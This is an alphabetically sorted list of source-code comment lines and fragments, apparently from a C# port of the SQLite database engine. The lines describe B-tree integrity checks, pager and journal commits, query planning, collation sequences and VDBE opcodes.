 Check for complete coverage of the page
 Check for constraints on a range of rowids in a table scan.
 Check for locking consistency 
 Check for one of the special errors 
 Check for the following errors:
 Check if data must be read/written to/from the btree page itself. 
 Check if the index cursor is past the end of the range. 
 Check if the query is of one of the following forms:
 Check if this call is removing or replacing an existing collation
 Check out all the cells.
 Check payload overflow pages
 Check sanity of left child page.
 Check schema cookies in all databases.  If any cookie is out
 Check some assumptions:
 Check table to see if the ORDER BY clause in pOrderBy can be satisfied
 Check that a table or index named 'zName' does not already exist
 Check that argument nHeight is less than or equal to the maximum
 Check that if the table scanned by this loop iteration had an
 Check that the affinity that will be used to perform the
 Check that the entry in the pointer-map for page iChild maps to
 Check that the new column is not specified as PRIMARY KEY or UNIQUE.
 Check that the pCache.pSynced variable is set correctly. If it
 Check that the page exists
 Check that the page has just been zeroed by zeroPage() 
 Check that the trigger name is not reserved and that no trigger of the
 Check that the values read from the page-size and sector-size fields
 Check that there are at least nSavepoint savepoints open. If there are
 Check that there isn't an ORDER BY without a LIMIT clause.
 Check that this is either a no-op (because the requested lock is
 Check the existence and status of a file.
 Check the integrity of the freelist
 Check the integrity of the freelist or of an overflow page list.
 Check the value in register P3.  If is is NULL then Halt using
 Check the value of global database parameter number 0 (the
 Check to collation names to see if they are compatible.
 Check to make sure the given table is writable.  If it is not
 Check to make sure the sqlite_stat1 table exists 
 Check to make sure there is enough space in the gap to satisfy
 Check to make sure we have a valid db pointer.  This test is not
 Check to see if an existing table or index can be used to
 Check to see if column iCol of the given statement is valid.  If
 Check to see if element iRowid was inserted into the the rowset as
 Check to see if flattening is permitted.  Return 0 if not.
 Check to see if index pSrc is compatible as a source of data
 Check to see if it is OK to read this particular column.
 Check to see if pExpr is a duplicate of another aggregate
 Check to see if pIndex uses the collating sequence pColl.  Return
 Check to see if the column is in one of the tables in the FROM
 Check to see if the given expression is a LIKE or GLOB operator that
 Check to see if the given expression is of the form
 Check to see if the i-th bit is set.  Return true or false.
 Check to see if the new index entry will be unique 
 Check to see if the subquery can be absorbed into the parent. 
 Check to see if we can get away with using just the index without
 Check to see if we need to create an sqlite_sequence table for
 Check to see if we need to simulate an interrupt.  This only happens
 Check to see if we should honor DESC requests on index columns
 Check to see if zRight and zLeft refer to a pragma that queries
 Check to see the left operand is a column in a virtual table 
 Check to verify that it is possible to get a read lock on all
 Checksum of string zMaster 
 Checksum used for sanity checking 
 Checksum value to return 
 Child page number 
 Chose the best index to use for each table in the FROM clause.
 Clean  up and report errors.
 Clean out and delete the BtShared object.
 Clean up a VDBE after execution but do not delete the VDBE just yet.
 Clean up and delete a VDBE after execution.  Return an integer which is
 Clean up and return
 Clean up before exiting 
 Clean up the VM after execution.
 Cleanup 
 Cleanup before returning.
 Clear (destroy) the BtShared.pHasContent bitvec. This should be
 Clear MemPage.isInit to make sure the corruption detection code in
 Clear a cache entry.
 Clear all column cache entries.
 Clear an expression structure without deleting the structure itself.
 Clear any and all virtual-table information from the Table record.
 Clear any existing type flags from a Mem and replace them with f
 Clear any prior statistics 
 Clear flags from pages of the page cache 
 Clear operations are exceedingly rare.  There are usually between
 Clear the PGHDR_NEED_SYNC flag from all dirty pages.
 Clear the YMD and HMS and the TZ
 Clear the column names from a table or view.
 Clear the column names from every VIEW in database idx.
 Clear the current cursor position.
 Clear the i-th bit.
 Cleared
 Client data for xCreate/xConnect 
 Close a VDBE cursor and release all the resources that cursor
 Close a blob handle that was previously created using
 Close a cache.
 Close a cursor previously opened as P1.  If P1 is not
 Close a cursor.  The read lock on the database file is released
 Close a file.
 Close all cursors opened via this handle.  
 Close all cursors.
 Close all of the cursors that were opened by sqlite3WhereBegin.
 Close all open savepoints. This function only manipulates fields of the
 Close all tables 
 Close all tables opened 
 Close an existing SQLite database
 Close an open database and invalidate all cursors.
 Close the cursors after the loop if there are no row triggers 
 Close the file.
 Closes an open [BLOB handle].
 Closing a BLOB shall cause the current transaction to commit
 Closing the BLOB often forces the changes
 Coalesce adjacent free blocks 
 Code AFTER triggers 
 Code an OP_Expire at the end of each PRAGMA program to cause
 Code an OP_TableLock instruction for each table locked by the
 Code an OP_VerifyCookie and OP_TableLock for <table>. 
 Code an output subroutine for a coroutine implementation of a
 Code that appears at the end of the integrity check.  If no error
 Code the SELECT statements to our left
 Code the current SELECT statement
 Code to update the sqlite_master tables and internal schema definitions
 ColCache valid when aColCache[].iLevel<=iCacheLevel 
 CollSeq
 Collating sequence 
 Collating sequence for LHS 
 Collating sequence for each term of the key 
 Collating sequence for the result set 
 Collating sequence must be the same on all columns 
 Collating sequence name 
 Collating sequence specified explicitly 
 Collating sequence to use on this term 
 Collation and sort-order information 
 Collation sequence name 
 Collation sequence names 
 Collations are destroyed when they are overridden by later calls to the
 Collect rowids of every row to be deleted.
 Collisions are on the FuncDef.pHash chain.
 Column affinity types.
 Column definitions created by an ALTER TABLE command may only have
 Column for inequality constraints 
 Column index on lhs of IN operator 
 Column name 
 Column names corresponding to IDLIST. 
 Column names for INSERT 
 Column names to return 
 Column number 
 Column number in the sorting index 
 Column number of LHS 
 Column number within the source table 
 Column on left-hand side of constraint 
 Column pCol
 Column that is the INTEGER PRIMARY KEY 
 Columns in a table
 Columns in a view
 Columns in an index
 Columns in the other table 
 Columns in this table that point to other table 
 Columns that change in an UPDATE statement 
 Combined MEM_
 Combined size of cells place on i-th page 
 Comment 
 Comment to improve readability 
 Commit a transaction
 Commit by deleting journal file 
 Commit by truncating journal 
 Commit by zeroing journal header 
 Commit the transaction currently in progress.
 Common case: early out without every having to acquire a mutex 
 Common features 
 Compare against 2
 Compare the 19-character string zNum against the text representation
 Compare the key of the index entry that cursor pC is pointing to against
 Compare the values in register P1 and P3.  If reg(P3)<reg(P1) then
 Compare to vectors of registers in reg(P1)..reg(P1
 Compare two UTF-8 strings for equality where the first string can
 Comparing signed and unsigned 
 Comparison information for duplicate removal 
 Comparison information for merging rows 
 Compile the UTF-16 encoded SQL statement zSql into a statement handle.
 Compile the UTF-8 encoded SQL statement zSql into a statement handle.
 Complete SELECT tree 
 Complete information about the WHERE clause 
 Complete text of a module argument 
 Complete text of the cell 
 Compound SELECTs that have an ORDER BY clause are handled separately.
 Computation results are stored on a set of registers numbered beginning
 Compute a string length that is limited to what can be stored in
 Compute a string that describes the P4 parameter for an opcode.
 Compute and store the full pathname in an allocated buffer pointed
 Compute both YMD and HMS
 Compute collating sequences used by
 Compute in len the number of bytes of data we need to read in order
 Compute new data for this record.
 Compute the best index for a virtual table.
 Compute the comparison permutation and keyinfo that is used with
 Compute the complete text of the CREATE VIRTUAL TABLE statement 
 Compute the complete text of the CREATE statement 
 Compute the difference (in milliseconds)
 Compute the iLimit and iOffset fields of the SELECT based on the
 Compute the limit registers 
 Compute the remainder after integer division of the value in
 Compute the set of tables that might satisfy cases 1 or 2.
 Compute the soundex encoding of a word.
 Compute the total free space on the page 
 Compute the total number of bytes that a Cell needs in the cell
 Computed column name as a token 
 Condition is always true or false 
 Configuration settings for an individual database connection
 Configure the OP_TableLock instruction 
 Configure the OP_Transaction 
 Configure the OP_VerifyCookie 
 Configure the WhereClause.vmask variable so that bits that correspond
 Configure the cache_size limit for a cache.
 Configure the number of columns. Configure the cursor to
 Configured cache size 
 Conflict resolution algorithms. 
 Conflict resolution strategy 
 Connection handle 
 Connection mutex 
 Connection that caused SQLITE_LOCKED 
 Connection to notify of malloc failures 
 Connection to watch for unlock 
 Consider a scenario where one process is holding a read lock that
 Consider functions to be constant if all their arguments are constant
 Consider the following sequence of events:
 Consider the row to be NULL 
 Consider the term t2.z='ok' in the following queries:
 Consider this example:
 Console.Out : null
 Constants for the largest and smallest possible 64-bit signed integers.
 Constraint operator 
 Constraint:  If you have ENABLE_COLUMN_METADATA then you must
 Construct a new Expr object from a single identifier.  Use the
 Construct a new expression node and return a pointer to it.  Memory
 Construct a new expression node for a function with multiple
 Construct a trigger step that implements a DELETE statement and return
 Construct a trigger step that implements an UPDATE statement and return
 Construct an expression node for a unary postfix operator
 Construct an expression node for a unary prefix operator
 Construct the SELECT statement that will find the new values for
 Construct the schema tables.  
 Constructor
 Contains aggregate functions 
 Contains one or more aggregate functions 
 Content is unread 
 Content of a column from the table being analyzed 
 Content of the new cell 
 Content of this chunk 
 Content of this page 
 Contents of master journal file 
 Context argument for xBusyHandler 
 Context description (used for error msg) 
 Context for error messages 
 Context for the sanity check 
 Context of the fixation 
 Context pointer for xCreate/xConnect 
 Context pointer passed down through the tree-walk.
 Context that contains this SELECT 
 ContextPop
 Continue down into children 
 Continue rolling back records out of the main journal starting at
 Control and query of the open file handle.
 Convenience functions for opening and closing files using
 Convenient short-hand 
 Conversion buffer 
 Conversion paradigm 
 Conversion types fall into various categories as defined by the
 Conversions between UTF-16be and UTF-16le are always done in place and do
 Conversions continue until one with nextC==0 is encountered.
 Convert P2 registers beginning with P1 into a single entry
 Convert TK_COLUMN nodes into TK_AGG_COLUMN and make entries in
 Convert UTF-8 to multibyte character string.  Space to hold the
 Convert a 64-bit IEEE double into a 64-bit signed integer.
 Convert a DbPage obtained from the pager into a MemPage used by
 Convert a UTF-16 string in the native encoding into a UTF-8 string.
 Convert a UTF-8 filename into whatever form the underlying
 Convert a UTF-8 string to microsoft unicode (UTF-16
 Convert a schema pointer into the iDb index that indicates
 Convert a sorted list of elements (connected by pRight) into a binary
 Convert a sorted list of elements into a binary tree. Make the tree
 Convert an SQL-style quoted string into a normal string by removing
 Convert from YYYY-MM-DD HH:MM:SS to julian day.  We always assume
 Convert microsoft unicode to UTF-8.  Space to hold the returned string is
 Convert multibyte character string to UTF-8.  Space to hold the
 Convert pMem so that it has types MEM_Real or MEM_Int or both.
 Convert pMem so that it is of type MEM_Real.
 Convert pMem to type integer.  Invalidate any prior representations.
 Convert the N-th element of pStmt.pColName[] into a string using
 Convert the data in the temporary table into whatever form
 Convert the filename to the system encoding. 
 Convert the given register into a string if it isn't one
 Convert the list in p.pEntry into a sorted list if it is not
 Convert the pExpr to be a TK_AGG_COLUMN referring to that
 Convert the pStep.target token into a SrcList and return a pointer
 Convert this string to a double.
 Convert this tree into a linked list connected by the pRight pointers
 Convert to ascii 
 Convert zDate into one or more integers.  Additional arguments
 Convertion routines
 Copy Btree meta values 
 Copy data from buffer to page (a write operation) 
 Copy data from page to buffer (a read operation) 
 Copy nPage pages from the source b-tree to the destination.
 Copy of BtShared.maxLocal or BtShared.maxLeaf 
 Copy of BtShared.minLocal or BtShared.minLeaf 
 Copy of iPageSize in 16-bit variable 
 Copy of pOrig 
 Copy of pParse.pNewTable 
 Copy of the SELECT that implements the view 
 Copy original pages out of the journal and back into the
 Copy over the row data
 Copy over the sequence table
 Copy the b-tree node content from page pFrom to page pTo. 
 Copy the complete content of pBtFrom into pBtTo.  A transaction
 Copy the data from the source page into the destination page.
 Copy the overflow cells from pRoot to pChild 
 Copy the result of the function into register P3 
 Copy the result of the function to the P3 register. We
 Copy the value of register rNotFound (which is either NULL or 0)
 Coroutine supplying data 
 CorruptionFollowingBusyError</a> wiki page for a discussion of why
 Cost information from best[Virtual]Index() 
 Cost of using pProbe 
 Could not found an existing able or index to use as the RHS b-tree.
 Count down to first I/O error 
 Count the number of columns in the index that are satisfied
 Count the number of fullsyncs and normal syncs.  This is used to test
 Count the number of possible WHERE clause constraints referring
 Count the number of times that the LIKE operator (or GLOB which is
 Counter to limit the number of searches 
 Counter used to generate aColCache[].lru values 
 Counter variable 
 Counters used by sqlite3_stmt_status() 
 Create a cursor to hold the database open
 Create a divider cell to insert into pParent. The divider cell
 Create a key for accessing the index entry 
 Create a label to jump to when we want to abort the query 
 Create a mapping from variable numbers to variable names
 Create a new BTree table.  Write into piTable the page
 Create a new PCache object. Storage space to hold the object
 Create a new cursor for the BTree whose root is on the page
 Create a new entry if true 
 Create a new ephemeral function definition for the overloaded
 Create a new index for an SQL table.  pName1.pName2 is the name of the index
 Create a new mask for cursor iCursor.
 Create a new pager cache.
 Create a new savepoint structure. 
 Create a new sqlite3_value object.
 Create a new symbolic label for an instruction that has yet to be
 Create a new virtual database engine.
 Create a record and test for set membership. If the set contains
 Create a string from the zFromat argument and the va_list that follows.
 Create a temporary file name in zBuf.  zBuf must be big enough to
 Create an expression node for an identifier with the name of zName
 Create an sqlite3_backup process to copy the contents of zSrcDb from
 Create extra terms on the WHERE clause for each column named
 Create new databases in format 1 
 Create new entry if true and does not otherwise exist 
 Create new user functions.
 Create pseudo-tables for NEW and OLD
 Create the byte sequence used to represent a cell on page pPage
 Create the database if it does not exist 
 Create the destination temporary table if necessary
 Create the ephemeral table into which the update results will
 Create the mutex and shared memory used for locking in the file
 Create the new column data
 Create the new index entries and the new record.
 Create the rootpage for the index
 Create transient tab and store like SRT_Table /
 Create/open the named mutex 
 Creating a new table may probably require moving an existing database
 Creating a table (may require moving an overflow page).
 Creating a virtual table invokes the authorization callback twice.
 Current 'new' sibling page 
 Current 'old' sibling page 
 Current index in apPage[i] 
 Current insert batch 
 Current number of savepoints 
 Current operation 
 Current orconf policy 
 Current overflow page number 
 Current page of the b-tree 
 Current register 
 Current side of the stack 
 Current state number 
 Current tree root 
 Current value 
 Current write offset in the journal file 
 Currently there is an SQL level transaction open on the vacuum
 Cursor Debug.Assigned to each bit 
 Cursor P1 is open on an index.  So it has no data and its key consists
 Cursor number for table to be sorted 
 Cursor number for the table to be sorted 
 Cursor number of LHS 
 Cursor of table to get the new rowid 
 Cursor of the RHS table 
 Cursor open on the btree to be searched 
 Cursor pointing at blob row 
 Cursor pointing at record to retrieve. 
 Cursor pointing to entry to read from 
 Cursor to scan b-tree 
 Cursors from source and destination 
 Cursors that are not yet positioned 
 Cx 
 DATABASE 
 DB connection used for lookaside allocations. 
 DB_Empty ) == DB_Empty
 DB_SchemaLoaded ) != DB_SchemaLoaded 
 DB_UnresetViews means that one or more views have column names that
 DEBUG
 DEBUG 
 DEBUG_CLASS_ALL
 DEFAULT 
 DEFERRABLE 
 DEFERRED 
 DELETE 
 DELETE operations.
 DEPRECATED
 DESC 
 DESC order.
 DETACH 
 DISTINCT 
 DISTINCT keyword in SELECT statements.
 DISTINCT so it can be removed too. 
 DML statements invoke this opcode to return the number of rows
 DOUB 
 DROP 
 Data associated with this element 
 Data comes from this temporary cursor if >=0 
 Data for a NEW or OLD pseudo-table 
 Data from the btree layer 
 Data is coming from a SELECT.  Generate code to implement that SELECT
 Data is read to or from the buffer pBuf.
 Data space required for this record 
 Data stored in leaves only.  Implies INTKEY 
 Data stored on the pages immediately following the
 Data to write 
 Data type for this column 
 Data type mismatch 
 Data(0) is taken from register P1.  Data(1) comes from register P1
 DataSize() cannot fail 
 Data_base connection 
 Database Name   NULL            
 Database Name   Table Name      
 Database changes is detected by looking at 15 bytes beginning
 Database connection 
 Database connection associated with this table 
 Database connection currently using this Btree 
 Database connection for malloc errors 
 Database connection for reporting malloc problems 
 Database connection to notify of OOM errors 
 Database connection to read from 
 Database containing the table being updated 
 Database containing the trigger 
 Database currently in use 
 Database filename (UTF-16) 
 Database filename (UTF-8) 
 Database filename UTF-8 encoded 
 Database handle 
 Database handle. 
 Database header content 
 Database holding the object 
 Database idx for pTab 
 Database image size 
 Database in which module is registered 
 Database index for <database> 
 Database is closed 
 Database is empty 
 Database is open 
 Database key for encryption extension 
 Database name 
 Database name or NULL 
 Database number 
 Database number to create the table in 
 Database of the table 
 Database only autoinc table 
 Database pages read/written 
 Database schema version number for this file 
 Database size before freeing 
 Database that contains the table 
 Database to be rekeyed 
 Database to detach at end of vacuum 
 Database to write to 
 DatabaseName 
 DateTime y = new DateTime()
 Db.flags field.
 De-reference and close our copy of the shared memory handle 
 Deadlock detected. 
 Deallocate a WhereClause structure.  The WhereClause structure
 Deallocate all chunks from a RowSet.  This frees all memory that
 Deallocate all memory Debug.Associated with a WhereAndInfo object.
 Deallocate all memory Debug.Associated with a WhereOrInfo object.
 Deallocate and destroy a parser.  Destructors are all called for
 Deallocate page if true 
 Deallocates any cached error strings. 
 Debug listings of VDBE programs 
 Debug print SQL as it executes 
 Debug.Assert( pInfo.needToFreeIdxStr==0 
 Debug.Assert( pOrderBy.a[0].pExpr.iColumn==pIdx.aiColumn[nEq] )
 Debug.Assert( pOrderBy.nExpr==1 )
 Debug.Assert()able.
 Debug.Assert(PTF_LEAF == 1 << 3)
 Debug.Asserts() that follow verify that assumption
 Declare and initialize constant integer 'isDirect'. If the
 Declare that a function has been overloaded by a virtual table.
 Declare to the Vdbe that the BTree object at db.aDb[i] is used.
 Decode the flags byte (the first byte of the header) for a page
 Decode the page just read from disk 
 Decomposition into subterms 
 Decomposition of the WHERE clause 
 Decomposition of the entire WHERE clause 
 Decrement the free-list count by 1. Set iTrunk to the index of the
 Decrement the ref-count on a virtual table object. When the ref-count
 Decrement the reference count on a page. If the page is clean and the
 Default journal mode for attached dbs 
 Default locking-mode for attached dbs 
 Default lookaside buffer count 
 Default lookaside buffer size 
 Default maximum size for persistent journal files. A negative
 Default page size 
 Default value expressions must be constant.  Raise an exception if this
 Default value for the new column 
 Default value of this column 
 Defer deleting the Table object associated with the
 Deferred seek 
 Define the maximum size of a temporary filename
 Define the yytestcase() macro to be a no-op if is not already defined
 Definition: A <b>result table</b> is memory data structure created by the
 Defragment the page given.  All Cells are moved to the
 Deinitialize the memory allocation subsystem.
 Deinitialize the memory allocator 
 Deinitialize this module.
 Delete a P4 value if necessary.
 Delete a linked list of TriggerStep structures.
 Delete all contents of the database table or index whose root page
 Delete all foreign keys associated with this table. 
 Delete all indices associated with this table
 Delete all information from a single table in the database.  iTable is
 Delete all the content of a Select structure but do not deallocate
 Delete an IdList.
 Delete an entire SrcList including all its substructure.
 Delete an entire VDBE.
 Delete an entire database table or index whose root page in the database
 Delete an entire expression list.
 Delete any previous value and set the value of pMem to be an
 Delete any previous value and set the value stored in pMem to NULL.
 Delete any previous value and set the value to be a BLOB of length
 Delete entries associated with this table 
 Delete every item whose key was written to the list during the
 Delete the Table structure itself.
 Delete the entry that the cursor is pointing to.  The cursor
 Delete the given Select structure and all of its substructures.
 Delete the master journal file. This commits the transaction. After
 Delete the named file.
 Delete the old indices for the current record.
 Delete the record at which the P1 cursor is currently pointing.
 Delete the row 
 Delete the transient table structure associated with the
 Deprecated external interface.  Internal/core SQLite code
 Depth of node containing pCell 
 Depth of subquery recursion. 1 for no recursion 
 Depth of the tree so far 
 Dequoted name of collation sequence 
 Descend to the child node of the cell that the cursor currently
 Description of the table we are reading from 
 Deserialize the data blob pointed to by buf as serial type serial_type
 Designate a buffer for heap memory space 
 Designate a buffer for page cache memory space 
 Designate a buffer for scratch memory space 
 Designate the PRIMARY KEY for the table.  pList is a list of names
 Dest pager 
 Destination b-tree file 
 Destination database handle 
 Destination database name 
 Destination for SELECT on rhs of INSERT 
 Destination for coroutine A 
 Destination for coroutine B 
 Destination of SELECT results 
 Destroy a bitmap object.  Reclaim all memory used.
 Destroy a cache allocated using pcache1Create().
 Destroy the part of sqlite3_file that deals with wince locks
 Destructor for BtShared.pSchema 
 Destructor for pUser 
 Destructor for the aux data 
 Destructor for the codec 
 Destructor for the data 
 Destructor for the string 
 Destructor function 
 Detach this backup from the source pager. 
 Detection of misuse is unreliable.  Applications should not depend
 Determine if we are dealing with WindowsCE - which has a much
 Determine the current size of a file in bytes
 Determine the number of pages in the file. Store this in nPage. 
 Determine whether or not a cursor has moved from the position it
 Determine whether we should code this trigger 
 Developers using SQLite on an ARM7 should compile and run their
 Device characteristics 
 Did we have an exclusive lock
 Did we just have a reader lock
 Different API routines are called depending on whether or not this
 Different collating sequences 
 Different columns indexed 
 Different conflict resolution strategies 
 Different number of columns 
 Different sort orders 
 Digits prior to the decimal point 
 Direct rendering mode means take data directly
 Disable DontRollback() for all pages 
 Disable all error recovery processing in the parser push-down
 Disable all mutexing 
 Disable mutexing of database connections 
 Disable nuisance warnings on Borland compilers 
 Disable pWC.a[iParent] when this term disabled 
 Disable the API redefinition in sqlite3ext.h 
 Disables and re-enables match 
 Disabling a term causes that term to not be tested in the inner loop
 Disallow both ON and USING clauses in the same join
 Discard all pages from cache pCache with a page number (key value)
 Discard all unpinned pages in the cache with a page number equal to
 Discard the contents of the cache 
 Discard the contents of the cache.
 Discard the results.  This is used for SELECT statements inside
 Disconnect all the virtual table objects in the sqlite3.pDisconnect list.
 Disconnect these in next sqlite3_prepare() 
 Divide the value in register P1 by the value in register P2
 Divider cells in pParent 
 Dividing the largest possible negative 64-bit integer (1<<63) by
 Do N steps of incremental vacuuming on a database.
 Do Nothing 
 Do a deep comparison of two expression trees.  Return TRUE (non-zero)
 Do a memory allocation with statistics and alarms.  Assume the
 Do an analysis of the currently open database.  Store in
 Do an authorization check using the code and arguments given.  Return
 Do an integrity check of the B-Tree
 Do an integrity check on each database file 
 Do both phases of a commit.
 Do common setup for opcodes marked with one of the following
 Do common setup processing for any opcode that is marked
 Do constraint checks
 Do extra syncs of the journal for robustness 
 Do full auto-vacuum 
 Do no analysis for tables that have no indices 
 Do not allow any cells smaller than 4 bytes. 
 Do not analyze the TEMP database 
 Do not attempt to write if database file has never been opened.
 Do not both fixing the pDirtyPrev pointers.
 Do not bother reading content from disk if true 
 Do not bother to obtain readlocks 
 Do not code a test for this constraint 
 Do not copy the destructor 
 Do not create a trigger on a system table 
 Do not delete the table until the reference count reaches zero. 
 Do not do auto-vacuum 
 Do not enforce check constraints 
 Do not invoke sqlite3PagerUnref() on ppPage if an error is returned.
 Do not load page content if true 
 Do not need to test for a HAVING clause.  If HAVING is present but
 Do not save the results anywhere 
 Do not sync the journal if true 
 Do not use a rollback journal 
 Do not use an index-only search 
 Do not use journal.  No argument 
 Do not write content to disk 
 Do nothing if table already exists 
 Do nothing so that reg[P2] remains NULL 
 Do nothing.  This instruction is often useful as a jump
 Do some checking to help insure the file we opened really is
 Do the analysis.
 Do the b-tree integrity checks 
 Do the commit only if all databases successfully complete phase 1.
 Do the comparison
 Do the rest of the initialization under the recursive mutex so
 Do this before any decoding. 
 Do this now to avoid an oversize memory allocation.
 Do various sanity checks on a single page of a tree.  Return
 Do whatever the default action is 
 Documentation about VDBE opcodes is generated by scanning this file
 Don't do any authorization checks if the database is initialising
 Done with the mutex 
 Driver template for the LEMON parser generator.
 Drop a page from the cache. There must be exactly one reference to the
 Drop a trigger given a pointer to that trigger.
 Drop all SQLITE_MASTER table and index entries that refer to the
 Drop all triggers associated with the table being dropped. Code
 Drop and reload the internal table schema. 
 Drop any table triggers from the internal schema. 
 Drop the cell from the parent page. apDiv[i] still points to
 Drop the table and index from the internal schema 
 Duplicate an 8-byte value
 During code generation of statements that do inserts into AUTOINCREMENT
 Dx 
 Dynamic buffer allocated by sqlite3Malloc() 
 Dynamically allocated space for aArg[] 
 Dynamically allocated strings. %z 
 E )
 E - 1 : E - 13
 EACH 
 ELSE 
 END 
 EOF <- 0 
 EOF <- 1 
 EP2_Irreducible ) == 0 )
 EP2_MallocedToken ) != 0 )
 EP2_MallocedToken ) == 0 )
 EP_AnyAff ) != 0 )
 EP_Distinct ) != ( pB.flags 
 EP_Distinct ) != 0 )
 EP_Distinct ) != 0 ) return null
 EP_Distinct ) ) return false
 EP_ExpCollate
 EP_ExpCollate )
 EP_ExpCollate ) != 0 )
 EP_ExpCollate ) != 0 ) )
 EP_FixedDest ) == 0 )
 EP_FromJoin )
 EP_InfixFunc ) )
 EP_IntValue 
 EP_IntValue ) != 0 )
 EP_Reduced
 EP_Reduced 
 EP_Reduced ) )
 EP_Resolved ) != 0 )
 EP_Static ) )
 EP_TokenOnly
 EP_TokenOnly 
 EP_TokenOnly )
 EP_TokenOnly ) )
 EP_TokenOnly ) ) == 0 )
 EP_xIsSelect ) != 0 )
 ERROR.  return a NULL 
 ESCAPE 
 EXCEPT 
 EXCLUSIVE 
 EXCLUSIVE lock on the main database file.  Write the current page to
 EXCLUSIVE: An EXCLUSIVE lock precludes all other locks.
 EXISTS 
 EXPERIMENTAL
 EXPERIMENTAL 
 EXPERIMENTAL - This is not an official function.  The interface may
 EXPERIMENTAL - subject to change without notice 
 EXPLAIN 
 EXPLAIN QUERY PLAN.
 EXPRDUP_REDUCE ) != 0
 EXPRDUP_REDUCE ) != 0 )
 EXPRDUP_REDUCE ) )
 EXPR_REDUCEDSIZE or EXPR_TOKENONLYSIZE.
 EXPR_TOKENONLYSIZE. nToken is set to the number of bytes consumed
 Each REFERENCES clause generates an instance of the following structure
 Each SQL function is defined by an instance of the following
 Each SQL index is represented in memory by an
 Each SQL table is represented in memory by an instance of the
 Each SQLite module (virtual table definition) is defined by an
 Each VDBE holds the result of the most recent sqlite3_step() call
 Each a[] describes a term of the WHERE cluase 
 Each byte is interpreted as an 8-bit unsigned integer.
 Each cache entry is represented by an instance of the following
 Each call to sqlite3_backup_step() sets two values stored internally
 Each call to this routine overrides any prior callbacks registered
 Each callback contains the following information:
 Each database file to be accessed by the system is an instance
 Each database is an instance of the following structure.
 Each element in the hash table is an instance of the following
 Each entry in a RowSet is an instance of the following object.
 Each entry in an SQLite table has a unique 64-bit signed
 Each entry in the journal is an instance of the 9th item.
 Each foreign key constraint is an instance of the following structure.
 Each new VFS becomes the default VFS if the makeDflt flag is set.
 Each node of an expression in the parse tree is an instance
 Each open SQLite database is represented by a pointer to an instance of
 Each pointer stored in the sqlite3.aCollSeq hash table contains an
 Each prepared statement maintains various
 Each recursive mutex is an instance of the following structure.
 Each subquery gets a new NameContext.  The pNext field points to the
 Each symbol here is a terminal symbol in the grammar.
 Each table or subquery in the FROM clause is a separate element of
 Each term of aOrderBy records a column of the ORDER BY clause.
 Each thread may only have a single outstanding allocation from
 Each token coming out of the lexer is an instance of
 Each trigger present in the database schema is stored as an instance of
 Each type field is a varint representing the serial type of the
 Each value has a manifest type. The manifest type of the value stored
 Easiest thing to do in this scenario is to truncate the journal
 Effective size of the main journal 
 Ei is in pExpr.x.pList.a[i
 Either DELETE or UPDATE.  For error messages. 
 Either SQLITE_ATTACH or SQLITE_DETACH 
 Either a transaction needs to have been started or an OP_Open needs
 Either pColl!=0 or there was an OOM failure.  But if an OOM
 Either the call to sqlite3PcacheFetch() returned an error or the
 Either there is no active journal or the sub-journal is open or
 Either we found one or more cells (cntnew[0])>0) or pPage is
 Elements above are public.  All that follows is private to pcache.c
 Empirical testing showed that the 
 Empty ELSE clause 
 Enable all mutexing 
 Enable load_extension 
 Enable mutexing of core data structures 
 Enable or disable extension loading.  Extension loading is disabled by
 Enable or disable the extended result codes.
 Enable or disable the malloc status collection 
 Enable or disable the shared pager and schema features.
 Enable the lookaside-malloc subsystem 
 Enabling mutexes incurs a measurable performance penalty.
 Encode the database 
 Encoding did not change 
 Encoding for the data 
 Encoding of z.  0 for BLOBs 
 Encoding to use 
 End for loop over the format string 
 End helper function 
 End of first segment of main-journal records 
 End of function 
 End of input 
 End of pWC.a[] 
 End of processing for this SELECT 
 End of the delete loop 
 End of the loop
 End of the special code for wince
 End of the structure debug printing code
 End switch over the format type 
 End the database scan loop.
 Enforced by btreeInitPage() 
 Ensure that:
 Ensure the database schema has been loaded 
 Ensure the default expression is something that sqlite3ValueFromExpr()
 Ensure the table name matches database name and that the table exists 
 Ensure these symbols were not defined by some previous header file.
 Enter STATIC_MASTER mutex 
 Enter a mutex on the given BTree object.
 Enter and leave a mutex on a Btree given a cursor owned by that
 Enter the mutex of every btree in the array.  This routine is
 Enter the mutex on every Btree associated with a database
 Enter the mutexes 
 Enter the mutexes in accending order by BtShared pointer address
 Entry point.  Derived from zFile if 0 
 Ephemeral table used to enforce DISTINCT 
 Ephemeral.  Delete with VDBE 
 Ephermeral.  Delete with VDBE 
 Equal to pPage.aData 
 Erase all information in a table and add the root of the table to
 Erase all schema information from the in-memory hash tables of
 Erase the given database page and all its children.  Return
 Error and awaiting close 
 Error code from db file unlock operation 
 Error code from journal finalization operation 
 Error code returned by the function. 
 Error information 
 Error message 
 Error message from sqlite3_mprintf() 
 Error message stored here 
 Error message written here 
 Error messages will be written here 
 Error msg written here 
 Error returned by OsFileSize() 
 Establish a read-lock on the table at the shared-cache level. 
 Estimate the cost of a table scan.  If we do not know how many
 Estimated cost of using this index 
 Estimated number of output rows 
 Estimated number of rows in result set 
 Evaluate a view and store its result in an ephemeral table.  The
 Evaluate the equality constraints
 Evaluate the expression and insert it into the temp table 
 Even for (SELECT 1) we have: pSrc!=0 but pSrc->nSrc==0 
 Even if an IO or diskfull error occurred while journalling the
 Even though this opcode does not use dynamic strings for
 Evenly distribute the data in apCell[] across the new pages.
 Every [virtual table module] implementation uses a subclass
 Every [virtual table module] implementation uses a subclass of the
 Every cursor that the virtual machine has open is represented by an
 Every file opened by the [sqlite3_vfs] xOpen method populates an
 Every interface that accepts sqlite3_value arguments specifies
 Every page in the cache is controlled by an instance of the following
 Every place where this routine is called with setStatement!=0 has
 Every statement that might do an INSERT into an autoincrement
 Ex 
 Exactly one of the following macros must be defined in order to
 Exactly one page has been modified and store in the journal file.
 Example 1:  Consider a three-way compound SQL statement.
 Example:
 Example: Suppose the join is like this:
 Examples of terms under analysis:
 Exception:  If we are reading the names of permanent indices from the
 Exclusive access is required to the destination database for the 
 Execute SQL code.  Return one of the SQLITE_ success/failure
 Execute a rollback if a transaction is active and unlock the
 Execute as much of a VDBE program as we can then return.
 Execute the finalizer function for an aggregate.  P1 is
 Execute the step function for an aggregate.  The
 Execute zSql on database db. Return an error code.
 Execute zSql on database db. The statement returns exactly
 Existance of VDBE checked by caller 
 Existing configuration options might be discontinued.  Applications
 Existing database connections continue use the sharing mode
 Existing representations MEM_Int and MEM_Real are 
 Exit of after trigger program 
 Exit of before trigger program 
 Exit the mutexes and free the backup context structure. 
 Exit the recursive mutex on a Btree.
 Expand the space allocated for the given SrcList object by
 ExpandBlob( pIn2 ) != 0 ) goto no_mem
